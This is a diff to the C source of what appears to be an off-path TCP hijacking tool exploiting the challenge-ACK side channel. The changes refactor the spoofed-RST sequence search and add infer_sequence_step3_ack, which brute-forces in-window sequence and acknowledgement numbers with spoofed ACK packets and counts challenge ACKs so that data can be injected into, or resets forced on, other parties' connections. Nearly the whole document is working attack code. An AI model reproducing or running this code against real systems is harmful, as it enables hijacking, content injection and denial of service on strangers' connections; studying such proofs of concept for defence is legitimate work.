@@ -1254,7 +1254,7 @@ int infer_sequence_step2(u_long *pstart, u_long *pend)
 					/* return so the caller will work towards injection */
 					printf("[*] Found in-window sequence number: %lu (after %lu %lu)\n",
 							seq_block, diff.tv_sec, diff.tv_usec);
-					g_ctx.spoof.seq = seq_block;
+					spoof->seq = seq_block;
 					g_chack_cnt = 0;
 					return 1;
 				} else {
@@ -1282,7 +1282,7 @@ int infer_sequence_step2(u_long *pstart, u_long *pend)
 	return 0;
 }
 
-int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
+int infer_sequence_step3(u_long *pstart, u_long *pend)
 {
 	struct timeval infer_start, round_start, now, diff;
 	volatile conn_t *spoof = &(g_ctx.spoof);
@@ -1314,13 +1314,8 @@ int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 		// XXX: TODO: implement optmization for < 14 ports to probe...
 		for (seq_guess = pr_start; seq_guess > pr_end; seq_guess--) {
 			spoof->seq = seq_guess;
-			if (use_data) {
-				if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
-					return 0;
-			} else {
-				if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
-					return 0;
-			}
+			if (!tcp_send(g_ctx.pch, spoof, TH_RST, NULL, 0))
+				return 0;
 			usleep(g_ctx.packet_delay);
 			pkts_sent++;
 		}
@@ -1348,15 +1343,9 @@ int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 			if (saw_lt_100) {
 				gettimeofday(&now, NULL);
 				timersub(&now, &infer_start, &diff);
-				if (!g_ctx.inject_server && !g_ctx.inject_client) {
-					printf("[*] Finished! Connection should be reset now! (after %lu %lu)\n",
-							diff.tv_sec, diff.tv_usec);
-					// XXX: TODO: verify that it is reset?
-				} else {
-					printf("[*] Final sequence: %lu and ack: %lu (after %lu %lu)\n",
-							(u_long)g_ctx.spoof.seq, (u_long)g_ctx.spoof.ack,
-							diff.tv_sec, diff.tv_usec);
-				}
+				printf("[*] Finished! Connection should be reset now! (after %lu %lu)\n",
+						diff.tv_sec, diff.tv_usec);
+				// XXX: TODO: verify that it is reset?
 				g_chack_cnt = 0;
 				return 1;
 			}
@@ -1378,13 +1367,120 @@ int infer_sequence_step3(u_long *pstart, u_long *pend, int use_data)
 	return 0;
 }
 
+int infer_sequence_step3_ack(u_long *pstart, u_long *pend)
+{
+	struct timeval infer_start, round_start, now, diff;
+	volatile conn_t *spoof = &(g_ctx.spoof);
+	/* printing status */
+	u_long pr_start, pr_end, pkts_sent;
+	/* chunk-based search vars */
+	chunk_t *sched = NULL;
+	int nchunks = 0, ci = 0;
+	u_long seq_guess;
+	uint32_t old_ack = spoof->ack;
+	int step = 0;
+	u_long block_sz = g_ctx.packets_per_second;
+
+	gettimeofday(&infer_start, NULL);
+
+	spoof->ack -= g_ctx.winsz * 10;
+
+	/* build a schedule working from left to right */
+	sched = build_schedule(*pstart, *pend, block_sz, &nchunks);
+	if (!sched)
+		return 0;
+
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* set these for printing status */
+		pr_start = sched[ci].start;
+		pr_end = sched[ci].end;
+
+		/* send em! */
+		pkts_sent = 0;
+		// XXX: TODO: implement optmization for < 14 ports to probe...
+		// XXX: not limited by per-connection limit?!
+		for (seq_guess = pr_start; seq_guess < pr_end; seq_guess++) {
+			spoof->seq = seq_guess;
+			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
+				return 0;
+			usleep(g_ctx.packet_delay);
+			pkts_sent++;
+		}
+		/* we'll do maintenance after we check the results */
+
+#ifdef DEBUG_SEQ_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("[*] seq-infer: spoofed %lu RSTs in %lu %lu\n", pkts_sent,
+				diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
+			return 0;
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("seq-infer recv", &round_start, 1, 0);
+
+		printf("[*] seq-infer (%da): guessed seqs [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
+				step + 4, pr_start, pr_end, pkts_sent, g_chack_cnt);
+
+		if (g_chack_cnt == 100) {
+			/* the RCV.NXT is not in this block! keep trying... */
+			ci++;
+			if (ci == nchunks) {
+				printf("[!] Exhausted sequence number search without success :-/\n");
+				return 0;
+			}
+		} else if (g_chack_cnt < 100) {
+			if (step == 2) {
+				/* we found the block containing RCV.NXT! */
+				gettimeofday(&now, NULL);
+				timersub(&now, &infer_start, &diff);
+				spoof->ack = old_ack;
+				spoof->seq += (100 - g_chack_cnt);
+				printf("[*] Final sequence: %lu and ack: %lu (after %lu %lu)\n",
+						(u_long)spoof->seq, (u_long)spoof->ack,
+						diff.tv_sec, diff.tv_usec);
+				g_chack_cnt = 0;
+				return 1;
+			}
+
+			printf("[*] Narrowed sequence (%d) to: %lu - %lu, %lu possibilities\n",
+					step + 4, pr_start, pr_end, pr_end - pr_start);
+
+			*pstart = pr_start;
+			*pend = pr_end;
+
+			/* build a schedule working from left to right */
+			if (step == 0)
+				block_sz /= 4;
+			else
+				block_sz = 100;
+			free(sched);
+			sched = build_schedule(*pstart, *pend, block_sz, &nchunks);
+			if (!sched)
+				return 0;
+			ci = 0;
+			step++;
+		}
+
+		g_chack_cnt = 0;
+	}
+
+	/* should not be reached */
+	return 0;
+}
+
 int infer_sequence_number(void)
 {
 	u_long guess_start = 0, guess_end = UINT32_MAX;
 
 	if (g_ctx.start_seq) {
-		guess_start = g_ctx.start_seq - g_ctx.winsz;
-		guess_end = g_ctx.start_seq + g_ctx.winsz;
+		guess_start = g_ctx.start_seq - (g_ctx.winsz * 4);
+		guess_end = g_ctx.start_seq + (g_ctx.winsz * 4);
 	} else {
 		if (!infer_sequence_step1(&guess_start, &guess_end))
 			return 0;
@@ -1398,7 +1494,7 @@ int infer_sequence_number(void)
 	if (g_ctx.inject_server || g_ctx.inject_client)
 		return 1;
 
-	if (!infer_sequence_step3(&guess_start, &guess_end, 0))
+	if (!infer_sequence_step3(&guess_start, &guess_end))
 		return 0;
 
 	/* we must have reset the connection now, right? */
@@ -1679,15 +1775,11 @@ int conduct_offpath_attack(void)
 			return 0;
 
 		/* finish determining the sequence number */
-		tmp = g_ctx.spoof.ack;
-		g_ctx.spoof.ack -= g_ctx.winsz * 10;
 		guess_start = g_ctx.spoof.seq - g_ctx.winsz;
 		guess_end = g_ctx.spoof.seq + g_ctx.winsz;
 
-		if (!infer_sequence_step3(&guess_start, &guess_end, 1))
+		if (!infer_sequence_step3_ack(&guess_start, &guess_end))
 			return 0;
-
-		g_ctx.spoof.ack = tmp;
 
 		/* inject data as requested */
 		if (g_ctx.inject_server) {
